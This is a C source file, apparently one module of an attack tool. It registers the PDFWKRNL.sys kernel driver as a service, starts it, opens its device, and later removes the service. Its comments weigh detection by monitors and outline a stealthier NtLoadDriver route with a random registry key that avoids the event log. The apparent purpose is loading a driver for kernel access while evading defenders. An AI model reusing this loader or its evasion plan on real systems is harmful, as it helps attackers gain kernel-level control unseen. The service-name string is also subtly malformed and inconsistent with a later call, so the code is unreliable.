/*
 * driver_loader.c — register PDFWKRNL.sys as a service, start it, open device.
 *
 * Uses Service Control Manager (SCM) — visible to standard monitors. For
 * better stealth a NtLoadDriver path with a TEMP-named registry key is
 * commented in below; flip the macro in build.sh to enable.
 */
#include "common.h"

#ifndef DRV_LOAD_VIA_NTLOAD
#define DRV_LOAD_VIA_NTLOAD 0
#endif

static SC_HANDLE g_scm = NULL;
static SC_HANDLE g_svc = NULL;

static BOOL drv_register_via_scm(const wchar_t *path) {
    g_scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!g_scm) { ERR("OpenSCManagerW err=%lu", GetLastError()); return FALSE; }

    g_svc = CreateServiceW(g_scm, L"" PDFW_SERVICE_NAME "L", L"PDFWKRNL",
                           SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                           SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
                           path, NULL, NULL, NULL, NULL, NULL);
    if (!g_svc) {
        DWORD e = GetLastError();
        if (e == ERROR_SERVICE_EXISTS) {
            g_svc = OpenServiceW(g_scm, L"PDFWKRNL", SERVICE_ALL_ACCESS);
            if (!g_svc) { ERR("OpenServiceW err=%lu", GetLastError()); return FALSE; }
        } else {
            ERR("CreateServiceW err=%lu", e);
            return FALSE;
        }
    }

    if (!StartServiceW(g_svc, 0, NULL)) {
        DWORD e = GetLastError();
        if (e != ERROR_SERVICE_ALREADY_RUNNING) {
            ERR("StartServiceW err=%lu", e);
            return FALSE;
        }
    }
    return TRUE;
}

#if DRV_LOAD_VIA_NTLOAD
static BOOL drv_register_via_ntload(const wchar_t *path) {
    /* Stealthier path: write registry key under
     * HKLM\System\CurrentControlSet\Services\<name> with random name,
     * then NtLoadDriver(name). Skips SCM Event Log entry.
     */
    /* TODO: implement when SCM noise is unacceptable */
    (void)path;
    ERR("NtLoadDriver path not implemented in this build");
    return FALSE;
}
#endif

BOOL drv_register_and_load(const wchar_t *driver_path) {
#if DRV_LOAD_VIA_NTLOAD
    return drv_register_via_ntload(driver_path);
#else
    return drv_register_via_scm(driver_path);
#endif
}

BOOL drv_unregister_and_stop(void) {
    BOOL ok = TRUE;
    if (g_svc) {
        SERVICE_STATUS st = {0};
        if (!ControlService(g_svc, SERVICE_CONTROL_STOP, &st)) {
            DWORD e = GetLastError();
            if (e != ERROR_SERVICE_NOT_ACTIVE) {
                WARN("ControlService(STOP) err=%lu", e);
                ok = FALSE;
            }
        }
        if (!DeleteService(g_svc)) {
            WARN("DeleteService err=%lu", GetLastError());
            ok = FALSE;
        }
        CloseServiceHandle(g_svc); g_svc = NULL;
    }
    if (g_scm) { CloseServiceHandle(g_scm); g_scm = NULL; }
    return ok;
}

HANDLE drv_open_device(void) {
    HANDLE h = CreateFileA(PDFW_DEVICE_PATH, GENERIC_READ | GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        ERR("CreateFile(%s) err=%lu", PDFW_DEVICE_PATH, GetLastError());
        return NULL;
    }
    return h;
}
